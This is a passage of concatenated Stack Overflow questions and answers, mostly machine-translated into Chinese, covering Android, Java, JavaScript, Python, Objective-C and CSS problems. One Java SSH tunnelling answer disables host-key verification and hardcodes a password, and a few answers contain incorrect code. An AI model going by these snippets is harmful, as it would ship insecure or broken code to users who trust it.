  android.support.v4.app.ListFragment.getListView(ListFragment.java:222)
    04-06 11:45:03.731: E/AndroidRuntime(707):  at     
   com.example.android.fragments.HeadlinesFragment.onCreate(HeadlinesFragment.java:107)
    04-06 11:45:03.731: E/AndroidRuntime(707):  at  
   android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:834)
      04-06 11:45:03.731: E/AndroidRuntime(707):    at 
   android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1058)
    04-06 11:45:03.731: E/AndroidRuntime(707):  at   
    android.support.v4.app.FragmentManagerImpl.addFragment(FragmentManager.java:1156)
                  04-06 11:45:03.731: E/AndroidRuntime(707):    at 
   android.support.v4.app.FragmentActivity.onCreateView(FragmentActivity.java:270)
  4-06 11:45:03.731: E/AndroidRuntime(707):     at           a    
    android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:669)

   04-06 11:03.731: E/AndroidRuntime(707):  ... 21 more
   04-06 11:45:03.781: I/dalvikvm(707): Wrote stack traces to '/data/anr/traces.txt'
   04-06 11:45:04.201: I/dalvikvm(707): threadid=3: reacting to signal 3
      04-06 11:45:04.241: I/dalvikvm(707): Wrote stack traces to '/data/anr/traces.txt'
        04-06 11:45:04.351: I/dalvikvm(707): threadid=3: reacting to signal 3
       04-06 11:45:04.361: I/dalvikvm(707): Wrote stack traces to '/data/anr/traces.txt'
      04-06 11:45:20.781: I/Process(707): Sending signal. PID: 707 SIG: 9 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T07:11:55.580

**原因：android.view.InflateException：二进制 XML 文件第 23 行：膨胀类片段时出错**

您在 MainActivity 中使用的第 23 行的 XML 文件中有错误。

**原因：java.lang.IllegalStateException：尚未创建内容视图**

错误的原因可能是您正在尝试查找尚未创建的视图。

片段的生命周期是（来源：http: [//developer.android.com/reference/android/app/Fragment.html](http://developer.android.com/reference/android/app/Fragment.html)）

# javascript - KendoMobile 防止点击冒泡

> ID：15847953
> 
> 赞同：0
> 
> 时间：2013-04-06T06:43:53.413
> 
> 标签：javascript, kendo-ui, kendo-mobile

我正在尝试做这样的事情。

```
<a data-target="main-view" href="/home/index">
<div class="inner_div">Click here should not bubble to the container anchor</div>
</a> 
```

我试过的代码：

```
$('.inner_div').click(function(e) {
   $(this).addClass('measure');
   //e.preventDefault();
   e.stopPropagation();
   //return false;
}); 
```

我尝试了 jquery stopPropagation、preventDefault 等。但它在这里不起作用，因为 Kendo 在这里做一些我无法控制以防止默认的事情。

任何人都可以提出一种方法吗？

# android - Android：可绘制图像上的 FileNotFoundException

> ID：15847954
> 
> 赞同：0
> 
> 时间：2013-04-06T06:44:03.300
> 
> 标签：android, android-drawable

我正在尝试使用我在整个 stackoverflow 的多个帖子中看到的这段代码

```
 public static Bitmap loadBitmap(Context context, String filename) throws IOException {
           AssetManager assets = context.getResources().getAssets();
           InputStream buf = new BufferedInputStream((assets.open("drawable/" + filename)));
           Bitmap bitmap = BitmapFactory.decodeStream(buf);

           return bitmap;
   } 
```

但我得到一个“FileNotFoundException：drawable/filename”。我肯定有一个名称为我试图加载到可绘制文件夹中的文件。有任何想法吗？我尝试过使用和不使用文件扩展名，尝试将文件放入每个文件夹并尝试多个手机/模拟器。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:53:09.580

`AssetManager`旨在访问`assets`文件夹中的数据。因此，在您的示例中，它会查找`assets/drawable/filename`但未找到任何内容。

要从drawable中获取资源，应该使用

```
Drawable d = getResources().getDrawable(R.drawable.filename); 
```

如果你确定它是一个位图，你可以这样做：

```
Bitmap bm = ((BitmapDrawable)getResources()
                .getDrawable(R.drawable.filename)).getBitmap(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T11:09:41.230

你可以这样做...

```
// load image from Assets folder
        // get input stream
        InputStream mIms = getAssets().open("ic_launcher.png");
        // load image as Drawable
        Drawable mDraw = Drawable.createFromStream(mIms, null);
        // set image to ImageView
        mIms.setImageDrawable(mDraw); 
```

# java - 如何获取字符串并返回单词的大写格式

> ID：15847960
> 
> 赞同：1
> 
> 时间：2013-04-06T06:45:29.313
> 
> 标签：java, string, capitalize

```
int length = s.length();

if (length = 0){
    return s;
}

else {
    return s.charAt(0).toUpperCase()+ s.substring(1);
} 
```

我收到两个错误说：

```
if (length = 0){
^^^^^^^^^^
Type mismatch: cannot convert from int to boolean

return s.charAt(0).toUpperCase()+ s.substring(1);
       ^^^^^^^^^^^^^^^^^^^^^^^^^
Cannot invoke toUpperCase() on the primitive type char 
```

另外，如果它是空刺，则应将其退回。这就是我使用 If-Else 语句的原因。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:48:26.197

`if (length = 0)`应该`if (length == 0)`

您将值 0 分配给`length`而不是*将*其与 0 进行比较。

我建议你看看[这个](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.26)：

> 在运行时，赋值表达式的结果是赋值发生后变量的值。赋值表达式的结果本身不是变量。

这样，您`if`永远不会满意，因为其中的值评估为分配的值（在本例中为 0），因此您的程序转到`else`，您应该：

```
return Character.toUpperCase(s.charAt(0)) + s.substring(1); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T06:48:13.240

在您的`if`声明中，您将值分配`0`给`length`. 因此，您的编译器会抱怨，因为它需要一个`boolean`表达式，而不是`if`语句中的 int （赋值返回它正在分配的值，这就是它提到的原因`int`）。

您的意思是通过使用来评估布尔表达式`==`。

第二个问题是因为`charAt(int)`返回一个`char`原语，它没有任何方法。

在这种情况下，您可能希望使用`Character.toUpperCase(char)`您的第一个字符`String`并附加其余字符。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-06T06:49:00.680

您`==`在 if 语句中缺少

`charAt(0)`返回一个字符，使其成为字符串的一种方法是`Character.toString(c)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T06:49:47.170

将其更改为：

```
if (length == 0) {
    return s;
}

return Character.toUpperCase(s.charAt(0)) + s.substring(1); 
```

注意：如果字符串的长度正好是 1，你仍然会得到一个错误，因为`s.substring(1)`. 当字符串的长度正好为 1 时，您可能想要添加一个附加条件。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-06T06:50:12.010

这一行：

```
if (length = 0) { 
```

表示“*我想将长度设置为零*”。但你想要的是

```
if (length == 0) { 
```

这意味着“*长度是否为零？* ”

当您将整数传递到需要布尔值的地方时，第一条语句最终会导致异常。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-06T06:50:26.950

也许你可以试试这个：

```
String s = "testing";
String upper = s.toUpperCase();
System.out.print(upper); 
```

# java - 用于 SSH SOCKS 绑定（动态端口转发）的 Java 库？

> ID：15847961
> 
> 赞同：5
> 
> 时间：2013-04-06T06:45:39.107
> 
> 标签：java, linux, ssh, proxy, socks

我正在寻找一种在我的 java 应用程序中使用 ssh 绑定连接到远程服务器的方法。我在终端中输入如下命令来连接我的服务器：

```
ssh -D 1234 username@w.x.y.z 
```

然后我可以将我的浏览器袜子 ip 和端口配置为：

```
socks ip: 127.0.0.1
socks port: 1234 
```

并使用我的服务器浏览互联网

现在请帮助我在我的 java 应用程序中执行此操作。

目前我在我的程序中使用了一个名为 JSCH 的库，但我无法让我的应用程序工作。您对此问题有任何想法或示例代码或其他任何东西吗？

（请注意，Java 库中应同时支持 SOCKS v4 和 v5）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-05-12T19:32:51.510

你会得到多种选择

- [http://mina.apache.org/sshd-project/documentation.html](http://mina.apache.org/sshd-project/documentation.html) 受信任的 Apache 项目，以用户社区、文档和示例的形式提供良好的支持我认为这就是您所要求的。 [https://svn.apache.org/repos/asf/mina/sshd/trunk/sshd-core/src/test/java/org/apache/sshd/PortForwardingTest.java](https://svn.apache.org/repos/asf/mina/sshd/trunk/sshd-core/src/test/java/org/apache/sshd/PortForwardingTest.java)

- [http://www.jcraft.com/jsch/](http://www.jcraft.com/jsch/) 糟糕的文档，但已经存在了很长时间。示例代码非常好。

[http://code.google.com/p/ganymed-ssh-2/](http://code.google.com/p/ganymed-ssh-2/)

另一个具有足够文档的库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T11:28:11.927

我使用 jsch 作为示例程序在 scala 中破解了这样一个程序，

```
https://github.com/ymnk/dpfwds 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-09-20T05:12:41.343

根据[https://www.bytefold.com/java-ssh-tunnel-with-dynamic-port-forwarding/](https://www.bytefold.com/java-ssh-tunnel-with-dynamic-port-forwarding/)，您可以使用 Apache Mina 来完成此操作：

**依赖项**

```
 <dependency>
        <groupId>org.apache.mina</groupId>
        <artifactId>mina-core</artifactId>
        <version>3.0.0-M2</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.apache.sshd/sshd-core -->
    <dependency>
        <groupId>org.apache.sshd</groupId>
        <artifactId>sshd-core</artifactId>
        <version>2.1.0</version>
    </dependency>
    <dependency>
        <groupId>org.apache.sshd</groupId>
        <artifactId>sshd-putty</artifactId>
        <version>2.1.0</version>
    </dependency>
    <dependency>
        <groupId>org.apache.sshd</groupId>
        <artifactId>sshd-common</artifactId>
        <version>2.1.0</version>
    </dependency> 
```

**代码**

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.security.KeyPair;
import java.util.Collection;
import java.util.Collections;
import java.util.List;
import org.apache.sshd.client.SshClient;
import org.apache.sshd.client.auth.hostbased.HostKeyIdentityProvider;
import org.apache.sshd.client.keyverifier.AcceptAllServerKeyVerifier;
import org.apache.sshd.client.session.ClientSession;
import org.apache.sshd.common.NamedFactory;
import org.apache.sshd.common.config.keys.loader.pem.PEMResourceParserUtils;
import org.apache.sshd.common.config.keys.loader.putty.PuttyKeyUtils;
import org.apache.sshd.common.forward.PortForwardingEventListener;
import org.apache.sshd.common.session.Session;
import org.apache.sshd.common.util.net.SshdSocketAddress;
import org.apache.sshd.server.channel.PuttyRequestHandler;
import org.apache.sshd.server.forward.AcceptAllForwardingFilter;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
/**
 * This class
 * 
 * @author Ankit Katiyar
 *
 */
public class AmazonTest {
    private static String BASTION_SERVER_PASSWORD = "P@ssword1";
    private static final String BASTION_SERVER_USER = "ec2-user";
    private static final String BASTION_SEREVR_HOST = "ec2-18-191-207-91.us-east-2.compute.amazonaws.com";
    private static final String URL_TO_ACCESS = "http://www.google.com";
    public static void main(String[] args) {
        try {

            Collection<KeyPair> keys = null;
            // OPtional loading keys from a PEM file
            //keys=PEMResourceParserUtils.getPEMResourceParserByAlgorithm("RSA").loadKeyPairs(ClassLoader.getSystemResource("local-ps-test.pem").toURI().toURL(), null);

            // Optional: Using Putty key for login 
             keys=PuttyKeyUtils.DEFAULT_INSTANCE.loadKeyPairs(ClassLoader.getSystemResource("local-ps-private-key.ppk").toURI().toURL(), null);

            SshClient client = SshClient.setUpDefaultClient();
            client.setForwardingFilter(AcceptAllForwardingFilter.INSTANCE);
            client.setServerKeyVerifier(AcceptAllServerKeyVerifier.INSTANCE);
            client.start();
            // using the client for multiple sessions...
            try (ClientSession session = client.connect(BASTION_SERVER_USER, BASTION_SEREVR_HOST, 22).verify()
                    .getSession()) {
                // IF you use password to login provide here
                // session.addPasswordIdentity(BASTION_SERVER_PASSWORD); // for password-based
                // authentication

                session.addPublicKeyIdentity(keys.iterator().next());
                // authentication
                // Note: can add BOTH password AND public key identities - depends on the
                // client/server security setup
                session.auth().verify(10000);
                // start using the session to run commands, do SCP/SFTP, create local/remote
                // port forwarding, etc...
                session.addPortForwardingEventListener(new PortForwardingEventListener() {
                    @Override
                    public void establishedDynamicTunnel(Session session, SshdSocketAddress local,
                            SshdSocketAddress boundAddress, Throwable reason) throws IOException {
                        // TODO Auto-generated method stub
                        PortForwardingEventListener.super.establishedDynamicTunnel(session, local, boundAddress, reason);
                        System.out.println("Dynamic Forword Tunnel is Ready");
                    }
                });
                SshdSocketAddress sshdSocketAddress = session
                        .startDynamicPortForwarding(new SshdSocketAddress("localhost", 8000));
                System.out.println("Host: " + sshdSocketAddress.getHostName());
                System.out.println("Port: " + sshdSocketAddress.getPort());
                // Create a Proxy object to work with
                Proxy proxy = new Proxy(Proxy.Type.SOCKS,
                        new InetSocketAddress(sshdSocketAddress.getHostName(), sshdSocketAddress.getPort()));
                /**
                 * Now you can use this proxy instance into any URL until this SSH session is active. 
                 */

                // TEST one URL
                HttpURLConnection connection = (HttpURLConnection) new URL(URL_TO_ACCESS).openConnection(proxy);
                System.out.println("Proxy work:" + connection.getURL());
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                System.out.println("================== Data From URL ==================\n");
                String inputLine;
                while ((inputLine = in.readLine()) != null)
                    System.out.println(inputLine);
                in.close();
                System.out.println("================== Data From URL ==================\n");
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
} 
```

他的项目可以在[https://github.com/ankitkatiyar91/java-framework-examples/tree/master/java-tunneling找到](https://github.com/ankitkatiyar91/java-framework-examples/tree/master/java-tunneling)

依赖项可能已过时，API 可能已更改，但这应该可以帮助您入门。我在 30 分钟内使用了最新版本的 Apache Mina (2.1.4)。不要被他使用 3.0.0-M2 版的 mina-core 所迷惑。这个版本实际上早于 2.1.4 版本。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-06T07:46:21.157

有时阅读文档是有意义的。[JSch 主页上](http://www.jcraft.com/jsch/examples/ViaSOCKS5.java.html)有一个示例，可以满足您的需要。

# d3.js - 为什么我不能让这个 PJAX 示例工作？

> ID：15847963
> 
> 赞同：0
> 
> 时间：2013-04-06T06:46:01.293
> 
> 标签：d3.js

本页演示了如何在 d3 中使用 PJAX 加载外部 html 文件： [https ://gist.github.com/mbostock/1367999](https://gist.github.com/mbostock/1367999)

我已经复制了这个： [https ://dl.dropboxusercontent.com/u/1531353/Misc/Docudocker/trialpjax/trial.html](https://dl.dropboxusercontent.com/u/1531353/Misc/Docudocker/trialpjax/trial.html)

但是，我的版本不工作。当我点击一个链接（而不是将 html 加载到页面上）时，我收到一个 DOM 错误。我曾尝试使用 Chrome 控制台找出导致 DOM 错误的确切原因，但无济于事。有什么我忘记复制的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T09:43:44.823

加载`pjax("ul li a", "#main");`时`content`变量设置为“#main”

所以，在这个函数中：

```
function load(href) {
    d3.html(href, function(fragment) {
      var target = d3.select(content).node();
      target.parentNode.replaceChild(d3.select(fragment).select(content).node(), target);
      pjax(links, content); // reapply
    });
  } 
```

在行中：

```
target.parentNode.replaceChild(d3.select(fragment).select(content).node(), target); 
```

`#main`它正在加载的文档片段中寻找 , 的内容。

但是，在您的情况下，没有`#main`，因此它被设置为空。当您尝试使用 null 调用 replaceChild 时，您会遇到遇到的错误。

要修复它，请像他所做的那样设置您的其他页面，`#main`每个页面都有一个。

# javascript - Javascript 检查在 IE7 中不起作用

> ID：15847969
> 
> 赞同：0
> 
> 时间：2013-04-06T06:47:48.300
> 
> 标签：javascript, html, checkbox, internet-explorer-7

我将以下 HTML 编辑为更短且更易于理解：

```
<input type='checkbox' name='All' value='All' id='All' onclick='toggleAll(this)'/>
    <label for='All'> Everyone</label>
<input type='checkbox' name='Resp' value='Resp' id='Resp' onclick='toggleResp(this)'/>
    <label for='Resp'> Responsibles</label>
<input type='checkbox' name='9' value='9' id='9' onclick='toggleDept(this)' />
    <label for='9'> Department 9</label>
<input type='checkbox' name='3-9-9' value='3-9-9' id='3-9-9' />
    <label for='3-9-9'> Responsible Personnel 9</label>
<input type='checkbox' name='4-9-10' value='4-9-10' id='4-9-10' />
    <label for='4-9-10'> General Personnel 10</label>
<input type='checkbox' name='4-9-11' value='4-9-11' id='4-9-11' />
    <label for='4-9-11'> General Personnel 11</label> 
```

名称`4-9-10`中 4 代表用户类型，如果低于 4 则为用户`responsible`。9代表部门ID，10代表人员ID。

当我点击复选框`All`时，所有复选框都被选中：

```
function toggleAll(source) {
    inputs = document.getElementsByTagName("input");
    for (var i in inputs) {
        if(inputs[i].type == "checkbox") {
            inputs[i].checked = source.checked;
        }
    }
} 
```

当我点击复选框`Resp`时，所有负责人员的复选框都被选中：

```
function toggleResp(source) {
    inputs = document.getElementsByTagName("input");
    for (var i in inputs) {
        if (inputs[i].type == "checkbox") {
            if(parseInt(inputs[i].name.substring(0, inputs[i].name.indexOf("-"))) < 4)
                inputs[i].checked = source.checked;
        }
    }
} 
```

当我单击部门复选框时，会选中部门人员的复选框：

```
function toggleDept(source) {
    inputs = document.getElementsByTagName("input");
    deptId = source.name;
    for (var i in inputs) {
        if (inputs[i].type == "checkbox") {
            index = inputs[i].name.indexOf("-");
            lastIndex = inputs[i].name.lastIndexOf("-");
            iDeptId = inputs[i].name.substring(index + 1, lastIndex);
            if (index != -1 && iDeptId == deptId.toString())
                inputs[i].checked = source.checked;
        }
    }
} 
```

我有 3 个部门和不同数量的人员。一切都在 Firefox、Chrome 和 Yandex 中运行良好。但是，这仅在 IE7 中部分有效。例如，当我按下时`All`，只检查部门负责人和部门，根本不检查部门。`Responsible`检查并`Department`部分工作。

我的问题是：我的代码中是否有与早期版本的 IE7 不兼容的函数或 HTML 元素？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T07:05:30.673

只要在 IE 7 中打开调试器，您就会看到问题 - 按 F12

`'inputs[...].type' is null or not an object`

IE不喜欢作为ID，以9作为ID`'9'`运行时抛出异常`inputs[i]`

正如 mplungjan 所提到的，最好如下修改您的 JavaScript。虽然只修改了第一个

```
function toggleAll(source) {
    inputs = document.getElementsByTagName("input");
    for (var i=0; i<inputs.length; i++) {
        var input = inputs[i];
        if(input.type == "checkbox") {
            input.checked = source.checked;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:55:06.543

`for in`迭代集合和数组时请不要使用循环

您应该始终使用

```
for (var i=0, n=collection.length;i<n;i++) 
```

包含 document.getElementsByTagName 的数组和集合

# python - Python 3.2：关于类、类属性和对象值的信息

> ID：15847970
> 
> 赞同：0
> 
> 时间：2013-04-06T06:47:59.753
> 
> 标签：python, class

我是 Python 新手，正在学习类函数。有谁知道这方面的任何好的来源/例子？这是我写的一个例子。我正在尝试阅读有关 self 和**init的更多信息**

```
class Example:
    def __init__(a, b, c, d):
        self.a = a
        self.b = b
        self.c = c
        self.d = d

test = Example(1, 1, 1, 1) 
```

我去过 python.org 以及这个网站。我也一直在阅读 Python 初学者书籍，但我想了解更多信息。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T11:15:28.513

A couple of generic clarifications here:

*   Python's "class" keyword is not a function, it's a statement which signals to the language that the following code describes a class (a user-defined data type and its associated behavior). "class" takes a name (and a possibly empty list of "parent" classes) ... and introduces a "suite" (an indented block of code).
*   The "def" keyboard is a similar statement which defines a function. In your example, which **should** have read: *def *`_init_`*(self, a, b, c)*) you're defining a special type of function which is "part of" (associated with, bound to) the Example class. It's also possible (and fairly common) to create unbound functions. Commonly, in Python, unbound functions are simple called "functions" while those which are part of a class are called "methods" ... or "instance functions."
*   classes are templates for instantiating objects. The terms "instance" and "object" are synonymous in this context. Your example "test" is an instance ... and the Python interpreter "instantiates" and initializes that object according to the class description.
*   A class is also a "type", that is to say that it's a user definition of a type of data and its associated methods. "class" and "type" are somewhat synonymous in Python though they are conventionally used in different ways. The core "types" of Python data (integers, real numbers, imaginary/complex numbers, strings, lists, tuples, and dictionaries) are all referred to as "types" while the more complex data/operational structures are called classes. Early versions of Python were implemented with constraints that made the distinction between "type" and "class" more than merely a matter of terminological difference. However, the last several versions of Python have eliminated those underlying technical distinctions. Those distinctions related to "subclassing" (inheritance).
*   classes can be described as a set of additions and modifications to another class. This is called "inheritance" and the class which is derived from another in this manner is referred to as a "subclass." It's common for programmers to create hierarchies of classes ... with specific variations all deriving from more common bases. It's also common to define related functionality within the same files or sets of files. These are "class libraries" and sometimes they are built as "packages."
*   *`_init_`*() is a method; in particular it's the initializer for Python objects (instances of a class).
*   Python generally uses *`_..._`* (prefixing and suffixing pairs of underscore characters around selected keywords) for "special" method or attribute names ... which is intended to reduce the likelihood that its naming choices will conflict with the meaningful names that you might wish to give to your own methods. While you can name your other methods and attributes with this *`_XXXX_`* --- Python will not inherently treat that as an error --- it's an extremely bad idea to do so. Even if you don't pick any of the currently defined special names there's no guarantee that some future version of Python won't conflict with your usage later.
*   "methods" are functions ... but they are a type of function which is bound (associated with) a particular instance of a particular class. There are also "class methods" which are associated with the class rather than with a specific instance of the class.
*   In your example self.b, self.c and so on are "attributes" or "members" of the object (instance). (The terms are synonymous).
*   In general the purpose of object orient programming is to provide ways of describing types of data and operations on those types of data in a way that's amenable to both human comprehension and computerized interpretation and execution. (All programming languages are intended to strike some balance between human readability/comprehension and machine parsing/execution; but *object-oriented* languages do so specifically with a focus on the description and definition of "types," and the instantiation of those types into "objects" and finally the various interactions among those objects.
*   "self" is a Python specific convention for naming the special (and generally required) first argument to any bound method. It's a "self" reference (a way for the code in a method to refer to the object/instance's own attributes and other methods without any ambiguity). While you can call your first argument to your bound methods "a" (as you've unwittingly done in your Example) it's an extremely bad idea to do so. Not only will it likely confuse you later ... it will make no sense to anyone else trying to read your Python code).
*   The term "object-oriented" is confusing unless one is aware of the comparisons to other forms of programming language. It's an evolution from "procedural" programming. The simplest gist of that comparison is when you consider the sorts of functions one would define in a procedural language were one might have to define and separately name different functions to perform analogous operations on different types of data: print_student_record(this_student) vs. print_teacher_report(some_report) --- a programming model which necessitates a fair amount of overhead on the part of the programmer, to keep track of which functions work on which types. This sort of problem is eliminated in OO (object oriented) programming where one can, conceivably, call on this.print_() ... and, assuming one has created compatible classes, this will "print" regardless of whether "this" is a student (record/object) or a teacher (report/record/object). That's greatly oversimplified but useful for understanding the pressures which led to the development and adoption of OO based programming.
*   In Python it's possible to create classes with little or no functionality. Your example does nothing, yet, but transfer a set of arguments into "attributes" (members) during initialization (instantiation). After that you could use these attributes in programming statements like: *test.a += 1* and *print (test.a)*. This is possible because Python is a "multi-paradigm" language. It supports procedural as well as object-orient programming styles. Objects used this way are very similar to "structs" from the C programming language (predecessor to C++) and to the "records" in Pascal, etc. That style of programming is largely considered to be obsolete (particularly when using a modern, "very high level" language such as Python).

The gist of what I'm getting at is this ... you'll want to learn how to think of your data as the combination of it's "parts" (attributes) and the functionality that changes, manipulates, validates, and handles input, output, and possibly storage, of those attributes.

For example if you were writing a "code breaker" program to solve simply ciphers you might implement a "Histogram" object which counts the letter frequencies of a given coded message. That would have attributes (one integer for every letter) and behavior (feeding ports of the coded message(s) into the instance, splitting the strings into individual characters, filtering out all the non-letter characters, converting all the letters to upper or lower case, and counting them --- that is incrementing the integer corresponding to each letter). Additionally you'd need to have some way of querying the histogram ... for example getting list of the letters sorted by their frequency in the cipher text.

Once you had such a "histogram" class then you could think of ways to use that for your solver. For example to solve a cryptogram puzzle you might computer the histogram then try substituting "etaon" for the five most common ciphered letters ... then check how many of the "partial" strings (t.e for "the") match words, trying permutations, and so on. Each of these might be it's own class. A key point of programming is that your histogram class might be useful for counting all sorts of other things (even in a simple voting system or popularity context). A particular subclass or instantiation might make it a histogram of letters while others could be re-used for other types of "things" you want counted. Similarly the code that iterates over permutions of some list might be used in any number of simulation, optimization, and related programs. (In fact Python's standard libraries already including "counters" and "permutations" functions in the "collections" and "itertools" modules, respectively).

Of course you're going to hear of all of these concepts repeatedly as you study programming. This has been a rather rambling attempt to kickstart that process. I know I've been a bit repetitious in a few points here --- part of that is because I'm typing this a 4am after having started work at 7am yesterday; but part of it serves a pedagogical purpose as well.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T07:22:50.380

您的类定义中有错误。**始终**`self`在方法中包含变量`__init__`。它代表对象本身的实例，应该作为所有方法的第一个参数包含在内。

你想通过这门课完成什么？到目前为止，它只存储了一些变量。尝试添加一些方法来增加一点趣味！Python 中的类有大量可用资源。首先，您可能想尝试一下：

[Python 编程 - 类](http://en.wikibooks.org/wiki/Python_Programming/Classes)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:51:07.667

我现在也在学习python，codecademy.com上有一个很好的介绍类

[http://www.codecademy.com/tracks/python](http://www.codecademy.com/tracks/python)

它有一个部分通过课程练习。希望这可以帮助

# objective-c - UINT32_MAX 是什么意思？

> ID：15847976
> 
> 赞同：-2
> 
> 时间：2013-04-06T06:48:33.923
> 
> 标签：objective-c

我在多种语言中看到了 UINT32_MAX，特别是在 Objective-C 中，但它是什么？

先感谢您。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:50:25.247

它是您可以存储在无符号 32 位整数中的最大数。

```
#define UINT32_MAX   (4294967295U) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:55:06.127

它是可以存储在无符号 32 位整数中的最大数，即 0xffffffff

# phpfox - 需要帮助以 phpfox 的注册形式调用核心字段（地址、城市、位置..）

> ID：15847983
> 
> 赞同：0
> 
> 时间：2013-04-06T06:49:51.963
> 
> 标签：phpfox

我知道通过自定义字段，我们可以添加字段并将其分配到注册表单。但在这种情况下，它会在用户个人资料中显示两次地址、城市等字段。这是因为 phpfox 在核心产品中有地址、城市等字段。所以我需要帮助才能在注册表单中调用核心产品字段.....

先感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T10:28:30.397

转到 AdminCP -> 设置 -> 管理设置 -> 注册。您可以选择在注册表中显示哪些字段。

# javascript - 如何根据屏幕尺寸响应左右两个 div 的 div

> ID：15847994
> 
> 赞同：0
> 
> 时间：2013-04-06T06:51:19.767
> 
> 标签：javascript, html, css

假设我有一个包含 2 个 div 的 div，

有没有办法让它根据屏幕尺寸做出响应？我想将此应用到移动版本，但我搞砸了......

```
<div id="primary">
<div id="left"><div id="object1" align='justify'>
<br/><br/>
<p>
If you told me this was a computer generated image of a mothership hovering over a planet's surface, I would have believed you. Instead, I had to look up desmids, which turned out to be a form of green algae. I would have guessed this is a cell in the process of dividing, but it turns out that one of the characteristic features of desmids is that they're a single cell divided into two compartments. (See, even I'm learning something from this.) Desmids are so tiny that this image was taken at 100x power. The green backdrop? It's a moss.
</p>
</div></div>

<div id="right"><div id="object3">
<b><h2>title</h2></b>
<img class="align-right" alt="" src="http://cdn.arstechnica.net/wp-content/uploads/2012/10/09_Place_22047_3_Drange.jpg"  style="width:200px" /></div></div></div> 
```

图像和 div 我不知道如何根据屏幕尺寸缩小它...

请看一下[jsfiddle](http://jsfiddle.net/FgnpL/) 实际上我不能让 div 容纳图像所在的 2 列，而不是在左列的同一级别...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T07:09:49.423

为此，您也有百分比填充和边距，只需应用一些数学...

***LeftDiv(padding:1% + margin:1% + width:44%) + RightDiv(padding:1% + margin:1% + width:44%) = 100%***

填充和边距适用于上、下、左、右 1%、1%、1%、1%...

**CSS：-**

```
#left, #right {
    margin: 1%;
    padding: 2%;
    width: 43%;
} 
```

如果您希望图像也具有响应性，请使其`width:100%;`

[http://jsfiddle.net/FgnpL/5/](http://jsfiddle.net/FgnpL/5/)

# iphone - 过滤数组中的字典

> ID：15847996
> 
> 赞同：-1
> 
> 时间：2013-04-06T06:51:28.887
> 
> 标签：iphone, ios, objective-c, nsmutablearray, nsmutabledictionary

在这里，我想过滤包含“cate = subcat”的数组中的字典，有人可以帮我吗

```
 menuArr :(
        {
        Cate = subcat;
        Description = "Grilled Chicken";
        Id = 2;
        Image = "http://asaraa.com/our_development/restaurant/admin/logo_image/large/28322grilled_chicken.jpg";
        Name = "Grilled Chicken";
        Price = 0;
        Qty = "";
        Title = "grilled chicken";
    },
        {
        Cate = product;
        Description = gravey;
        Id = 12;
        Image = "http://asaraa.com/our_development/restaurant/admin/logo_image/large/27166mutton.jpg";
        Name = gravey;
        Price = 50;
        Qty = 1;
        Title = gravey;
    },
        {
        Cate = product;
        Description = "Chicken Korma";
        Id = 15;
        Image = "http://asaraa.com/our_development/restaurant/admin/logo_image/large/77845Indian_chicken_recipes.jpg";
        Name = "Chicken Korma";
        Price = 99;
        Qty = 1;
        Title = "Chicken Korma";
    },
        {
        Cate = subcat;
        Description = "Chicken Sandwiches";
        Id = 16;
        Image = "http://asaraa.com/our_development/restaurant/admin/logo_image/large/67831chicken-sandwich-melt-0204_300.jpg";
        Name = "Chicken Sandwiches";
        Price = 0;
        Qty = "";
        Title = "Chicken Sandwiches";
    }
) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:56:00.440

```
NSString *searchString = @"subcat"
NSPredicate *predicate = [NSPredicate predicateWithFormat:@"Cate = %@",searchString];
NSArray *array = [yourArray filteredArrayUsingPredicate:predicate];
if (array.count > 0)
{
// here goes your code
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:55:49.613

使用[Linq to ObjectiveC](https://github.com/ColinEberhardt/LinqToObjectiveC#where)，您可以按如下方式对其进行过滤：

```
NSArray* itemsInCategory = [menuArr where:^BOOL(id dic) {
    return [[dic objectForKey:@"Cate"] isEqualToString:@"subcat"];
}]; 
```

这会找到 Cate=subcat 的所有字典。

* * *

## 回答 #3

> 赞同：0
> 
